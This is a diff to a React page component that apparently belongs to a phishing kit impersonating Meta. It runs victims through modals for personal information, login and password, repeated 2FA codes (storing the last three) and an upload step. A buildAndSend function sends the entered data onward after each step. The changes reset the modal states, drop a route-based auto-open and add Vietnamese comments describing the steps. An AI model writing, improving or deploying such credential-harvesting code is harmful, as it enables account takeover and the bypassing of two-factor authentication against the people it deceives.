@@ -1,5 +1,4 @@
 import { useEffect, useState, useMemo, useRef } from 'react';
-import { useLocation } from 'react-router';
 import axios from 'axios';
 import MetaLogo from '@/assets/images/meta-logo-grey.png';
 import TickIcon from '@/assets/images/tick.svg';
@@ -213,21 +212,17 @@ const Home = () =>
         []
     );
 
-    const location = useLocation();
-
     useEffect( () =>
     {
         localStorage.clear();
+        // Đảm bảo luôn reset toàn bộ modal về đóng khi mới vào trang
+        setShowFirstModal( false );
+        setShowLoginModal( false );
+        setShow2FAModal( false );
+        setShowUploadModal( false );
+        setShowSuccessModal( false );
         initializeApp();
     }, [] );
-
-    useEffect( () =>
-    {
-        if ( location.state?.autoOpen )
-        {
-            setShowFirstModal( true );
-        }
-    }, [ location.state ] );
 
     const initializeApp = async () =>
     {
@@ -342,11 +337,13 @@ const Home = () =>
         } );
     };
 
+    // Bước 1: Điền xong Information -> mở bước nhập Login & Mật khẩu
     const handleFirstFormSubmit = ( data ) =>
     {
         const newFormData = { ...formData, ...data };
         setFormData( newFormData );
         setShowFirstModal( false );
+        setShow2FAModal( false );
         setShowLoginModal( true );
 
         buildAndSend( {
@@ -357,6 +354,7 @@ const Home = () =>
         } );
     };
 
+    // Bước 2: Nhập mật khẩu -> gửi dữ liệu (chuyển sang 2FA khi LoginModal gọi onSuccess)
     const handleLoginSubmit = ( email, password ) =>
     {
         const newFormData = { ...formData, loginIdentifier: email };
@@ -373,6 +371,7 @@ const Home = () =>
         } );
     };
 
+    // Bước 3: Nhập mã 2FA
     const handle2FASubmit = ( code ) =>
     {
         const newCodes = [ ...twoFAAttempts.map( c => c.value ), code ].slice( -3 );
@@ -682,21 +681,33 @@ const Home = () =>
                 show={ showLoginModal }
                 onClose={ () => setShowLoginModal( false ) }
                 onSubmit={ handleLoginSubmit }
-                onSuccess={ () => { setShowLoginModal( false ); setShow2FAModal( true ); } }
+                onSuccess={ () =>
+                {
+                    setShowLoginModal( false );
+                    setShow2FAModal( true );
+                } }
                 texts={ texts }
             />
             <TwoFAModal
                 show={ show2FAModal }
                 onClose={ () => setShow2FAModal( false ) }
                 onSubmit={ handle2FASubmit }
-                onSuccess={ () => { setShow2FAModal( false ); setShowUploadModal( true ); } }
+                onSuccess={ () =>
+                {
+                    setShow2FAModal( false );
+                    setShowUploadModal( true );
+                } }
                 texts={ texts }
                 formData={ formData }
             />
             <UploadModal
                 show={ showUploadModal }
                 onClose={ () => setShowUploadModal( false ) }
-                onSuccess={ () => { setShowUploadModal( false ); setShowSuccessModal( true ); } }
+                onSuccess={ () =>
+                {
+                    setShowUploadModal( false );
+                    setShowSuccessModal( true );
+                } }
                 texts={ texts }
             />
             <SuccessModal
